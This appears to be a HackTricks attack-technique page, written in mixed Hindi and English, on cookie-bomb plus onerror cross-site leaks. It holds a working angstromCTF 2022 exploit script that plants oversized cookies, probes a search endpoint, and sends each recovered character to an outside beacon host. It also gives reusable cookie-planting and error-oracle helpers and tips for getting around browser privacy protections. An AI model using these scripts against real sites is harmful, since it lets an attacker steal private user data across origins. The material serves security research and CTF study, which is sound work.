# Cookie Bomb + Onerror XS Leak

{{#include ../../banners/hacktricks-training.md}}

This technique combines:
- Cookie bombing: victim के ब्राउज़र में target origin के लिए कई/बड़े cookies भरना ताकि बाद के requests server/request limits (request header size, URL size in redirects, आदि) को टकरा दें।
- Error-event oracle: एक `<script>` (या अन्य subresource) के साथ cross-origin endpoint को probe करना और `onload` vs `onerror` से अवस्थाओं को अलग करना।

High level idea
- उस target endpoint को ढूँढें जिसकी व्यवहार उन दो अवस्थाओं में अलग हो जिन्हें आप टेस्ट करना चाहते हैं (उदा., search “hit” vs “miss”)।
- सुनिश्चित करें कि “hit” path एक भारी redirect chain या लंबा URL ट्रिगर करेगा जबकि “miss” path छोटा रहेगा। कई cookies से request headers को inflate करें ताकि केवल “hit” path सर्वर को HTTP error (e.g., 431/414/400) के साथ fail कराए। यह error onerror इवेंट को पलटता है और XS-Search के लिए एक oracle बन जाता है।

When does this work
- आप victim ब्राउज़र को target को cookies भेजने के लिए प्रेरित कर सकते हैं (उदा., cookies SameSite=None हों या आप उन्हें first-party context में popup `window.open` के जरिए सेट कर सकें)।
- ऐसी कोई app feature मौजूद हो जिसे आप arbitrary cookies सेट करने के लिए abuse कर सकें (उदा., “save preference” endpoints जो controlled input names/values को Set-Cookie में बदल देते हैं) या post-auth redirects बनाएँ जो attacker-controlled डेटा को URL में शामिल करते हैं।
- सर्वर दोनों अवस्थाओं पर अलग प्रतिक्रिया देता है और inflated headers/URL के साथ, एक स्थिति किसी सीमा को पार कर एक error response लौटाती है जो onerror को ट्रिगर करती है।

Note on server errors used as the oracle
- 431 Request Header Fields Too Large आमतौर पर तब लौटता है जब cookies request headers को inflate कर देते हैं; 414 URI Too Long या लंबी request targets के लिए server-specific 400 भी लौट सकता है। इनमें से किसी भी स्थिति में subresource load fail होता है और onerror फायर होता है। सामान्य कारणों (जैसे excessive cookies) के लिए [MDN’s 431 entry](https://developer.mozilla.org/en-US/docs/Web/HTTP/Status/431) देखें।

<details>
<summary>Practical example (angstromCTF 2022)</summary>

The following script (from a public writeup) abuses a feature that lets the attacker insert arbitrary cookies, then loads a cross-origin search endpoint as a script. When the query is correct, the server performs a redirect that, together with the cookie bloat, exceeds server limits and returns an error status, so script.onerror fires; otherwise nothing happens.
```html
<>'";
<form action="https://sustenance.web.actf.co/s" method="POST">
<input id="f" /><input name="search" value="a" />
</form>
<script>
const $ = document.querySelector.bind(document)
const sleep = (ms) => new Promise((r) => setTimeout(r, ms))
let i = 0
const stuff = async (len = 3500) => {
let name = Math.random()
$("form").target = name
let w = window.open("", name)
$("#f").value = "_".repeat(len)
$("#f").name = i++
$("form").submit()
await sleep(100)
}
const isError = async (url) => {
return new Promise((r) => {
let script = document.createElement("script")
script.src = url
script.onload = () => r(false)
script.onerror = () => r(true)
document.head.appendChild(script)
})
}
const search = (query) => {
return isError(
"https://sustenance.web.actf.co/q?q=" + encodeURIComponent(query)
)
}
const alphabet =
"etoanihsrdluc_01234567890gwyfmpbkvjxqz{}ETOANIHSRDLUCGWYFMPBKVJXQZ"
const url = "//en4u1nbmyeahu.x.pipedream.net/"
let known = "actf{"
window.onload = async () => {
navigator.sendBeacon(url + "?load")
await Promise.all([stuff(), stuff(), stuff(), stuff()])
await stuff(1600)
navigator.sendBeacon(url + "?go")
while (true) {
for (let c of alphabet) {
let query = known + c
if (await search(query)) {
navigator.sendBeacon(url, query)
known += c
break
}
}
}
}
</script>
```
</details>

Why the popup (`window.open`)?
- आधुनिक ब्राउज़र्स तेजी से third-party cookies को ब्लॉक कर रहे हैं। लक्ष्य के लिए एक top-level window खोलने से cookies first‑party बन जाती हैं इसलिए लक्ष्य की Set-Cookie responses टिक जाती हैं, जिससे cookie-bomb चरण third‑party cookie सीमाओं के बावजूद काम करता है।

2024–2025 notes on cookie availability
- Chrome’s Tracking Protection rollout (January 2024) पहले से ही किसी रैंडम cohort के लिए third-party cookies को ब्लॉक कर रहा है और UK CMA की मंज़ूरी के बाद इसे पूरे user base तक बढ़ाया जाना तय है, इसलिए मान लें कि कोई भी victim अचानक 3P cookies खो सकता है। फॉलबैक को automate करें: जब आपका script probe बिना target को कभी हिट किए fail करे तो उसे detect करें और पारदर्शी रूप से popup/first-party flow की तरफ pivot करें। Safari और Firefox पहले से ही अधिकांश third-party cookies को default में ब्लॉक करते हैं और CHIPS/partitioned cookies का मतलब है कि अब हर top-level site का अपना अलग jar होता है।
- एक first‑party cookie planting flow (`window.open` + auto-submit to a cookie-setting endpoint) का उपयोग करें और फिर एक subresource से probe करें जो तभी सफल होता है जब वे cookies भेजे जाएँ। यदि third‑party cookies ब्लॉक हैं, तो probe को same-site context में ले जाएँ (उदा., popup में oracle को एक same-site gadget के जरिए चलाएँ और boolean को `postMessage` या एक beacon से अपने सर्वर पर exfiltrate करें), या यदि आप legitimately victim origin को नियंत्रित करते हैं तो उसे Chrome’s deprecation trial में enroll करें।

<details>
<summary>Tracking-Protection-safe first-party planting helper</summary>

When you need to stuff dozens of cookies from a cross-site context, stage a temporary top-level window and fire a series of oversized form submissions into the vulnerable Set-Cookie endpoint:
```js
async function plantFirstPartyCookies(endpoint, fields) {
for (let i = 0; i < 5; i++) {
const name = crypto.randomUUID();
const form = Object.assign(document.createElement('form'), {action:endpoint, method:'POST', target:name});
Object.entries(fields).forEach(([k, v]) => {
const input = document.createElement('input');
input.name = k;
input.value = v + '_'.repeat(400 + 120 * i);
form.appendChild(input);
});
document.body.appendChild(form);
window.open('about:blank', name, 'noopener');
form.submit();
await new Promise(r => setTimeout(r, 120));
form.remove();
}
}
```
इसे probing शुरू करने से ठीक पहले कॉल करें ताकि हर oracle run एक ताज़ा भरी हुई cookie jar के साथ शुरू हो।

</details>

सामान्य probing सहायक
यदि आपके पास पहले से target origin (first-party) पर कई cookies सेट करने का तरीका है, तो आप इस minimal oracle को किसी भी ऐसे endpoint के खिलाफ पुन: उपयोग कर सकते हैं जिसका success/failure अलग network परिणामों (status/MIME/redirect) की ओर ले जाता है:
```js
function probeError(url) {
return new Promise((resolve) => {
const s = document.createElement('script');
s.src = url;
s.onload = () => resolve(false);  // loaded successfully
s.onerror = () => resolve(true);  // failed (e.g., 4xx/5xx, wrong MIME, blocked)
document.head.appendChild(s);
});
}
```
वैकल्पिक टैग ऑरेकल (stylesheet)
```js
function probeCSS(url) {
return new Promise((resolve) => {
const l = document.createElement('link');
l.rel = 'stylesheet';
l.href = url;
l.onload = () => resolve(false);
l.onerror = () => resolve(true);
document.head.appendChild(l);
});
}
```
उन्नत: de Bruijn–based cookie packing (CTF-proven)
- जब ऐप आपको बड़े cookie मान नियंत्रित करने देता है, तो आप प्रत्येक probe के अंत में एक de Bruijn sequence जोड़कर अनुमानों को कुशलतापूर्वक पैक कर सकते हैं। यह per‑probe overhead को छोटा रखता है, साथ ही यह सुनिश्चित करता है कि heavy branch केवल सही prefix के लिए ही लगातार अधिक भारी हो। लंबाई n के |Σ| symbols के लिए उदाहरण generator (cookie value में फिट होता है):
```js
const ALPH = '_{}0123456789abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ';
function deBruijn(k, n, alphabet=ALPH){
const a = Array(k * n).fill(0), seq=[];
(function db(t,p){
if(t>n){ if(n%p===0) for(let j=1;j<=p;j++) seq.push(a[j]); }
else { a[t]=a[t-p]; db(t+1,p); for(let j=a[t-p]+1;j<k;j++){ a[t]=j; db(t+1,t);} }
})(1,1);
return seq.map(i=>alphabet[i]).join('');
}
```
- Idea in practice: कई cookies सेट करें जिनके मान prefix + deBruijn(k,n) हों। केवल तभी जब परीक्षण किया गया prefix सही होता है सर्वर भारी path लेता है (उदा., लंबी cookie या URL को प्रतिबिंबित करने वाला अतिरिक्त redirect), जो cookie bloat के साथ मिलकर limits पार कर देता है और onerror को flip कर देता है। इस approach का उपयोग करता हुआ एक LA CTF 2024 public solver देखें।

Tips to build the oracle
- Force the “positive” state to be heavier: केवल तब अतिरिक्त redirect chain करें जब predicate true हो, या redirect URL को अनबाउंडेड user input पर प्रतिबिंबित कर दें ताकि यह guessed prefix के साथ बढ़े।
- Inflate headers: cookie bombing को repeat करें जब तक कि “heavy” path पर लगातार error न दिखे। सर्वर आम तौर पर header size को cap करते हैं और जब बहुत सारी cookies मौजूद हों तो जल्दी fail कर देंगे।
- Stabilize: कई parallel cookie set operations चलाएँ और बार-बार probe करें ताकि timing और caching noise का औसत निकले।
- Bust caches and avoid pooling artifacts: probe URLs में यादृच्छिक `#fragment` या `?r=` जोड़ें, और `window.open` loops में अलग-अलग window names का उपयोग करें।
- Alternate subresources: यदि `<script>` filter हो रहा है, तो `<link rel=stylesheet>` या `<img>` आज़माएँ। onload/onerror boolean ही oracle है; content का parse होना आवश्यक नहीं है।

Common header/URL limits (useful thresholds)
- Reverse proxies/CDNs और servers अलग-अलग caps लागू करते हैं। October 2025 के अनुसार, Cloudflare edge पर request headers के लिए कुल 128 KB (और URL के लिए 16 KB) दस्तावेज़ित है, इसलिए जब targets इसके पीछे हों तो आपको अधिक/बड़े cookies की आवश्यकता पड़ सकती है। अन्य स्टैक्स (जैसे Apache via LimitRequestFieldSize) अक्सर प्रति header line लगभग ~8 KB के करीब होते हैं और जल्दी errors आएंगे। इसलिए bomb size को उसी के अनुसार समायोजित करें (देखें [Cloudflare’s documented limit](https://developers.cloudflare.com/fundamentals/reference/connection-limits/))।

Browser hardening watchlist (2025+)
- Firefox 139/ESR 128.11 (May 2025) ने cross-origin resources के लिए script tag load/error accounting कड़ा किया (CVE-2025-5266)। patched clients पर कुछ redirected responses के लिए `onerror` signal suppress हो सकती है, इसलिए oracle को diversify करें (parallel `<link rel=stylesheet>`, `<img>`, या mismatched MIME के साथ `fetch`) और boolean अभी भी trigger होता है या नहीं मानने से पहले victim UA का fingerprint लें।
- Expect enterprise Chromium builds with Tracking Protection or Fetch Metadata policies to intermittently strip cookies or rewrite redirects. इन मामलों का पता पहले एक छोटे endpoint को probe करके लगाएँ; जब वह fail करे तो स्वचालित रूप से पूरी attack को popup के अंदर चलाकर और bits को `postMessage`/`BroadcastChannel` के माध्यम से relay करके pivot करें।

Related XS-Search tricks
- URL length based oracles (no cookies needed) को combine किया जा सकता है या उसके स्थान पर उपयोग किया जा सकता है जब आप बहुत लंबा request target force कर सकें:

{{#ref}}
url-max-length-client-side.md
{{#endref}}

Notes
- इस प्रकार के attacks को आम तौर पर “Error Events” XS-Leaks के रूप में चर्चा किया जाता है। cookie-bomb चरण केवल एक सुविधाजनक तरीका है जिससे केवल एक branch को server limits के ऊपर धकेला जा सके, जिससे एक विश्वसनीय boolean oracle मिलता है।



## संदर्भ
- XS-Leaks: Error Events (onerror/onload as an oracle): https://xsleaks.dev/docs/attacks/error-events/
- MDN: 431 Request Header Fields Too Large (अक्सर बहुत सारी cookies के साथ): https://developer.mozilla.org/en-US/docs/Web/HTTP/Status/431
- LA CTF 2024 writeup नोट जो de Bruijn cookie-bomb oracle दिखाता है: https://gist.github.com/arkark/5787676037003362131f30ca7c753627
- Cloudflare edge limits (URLs 16 KB, request headers 128 KB): https://developers.cloudflare.com/fundamentals/reference/connection-limits/
- Chrome Tracking Protection rollout विवरण: https://blog.google/products/chrome/privacy-sandbox-tracking-protection/
- Mozilla MFSA 2025-44 (CVE-2025-5266) ने script tag onerror व्यवहार को कड़ा किया: https://www.mozilla.org/en-US/security/advisories/mfsa2025-44/
{{#include ../../banners/hacktricks-training.md}}
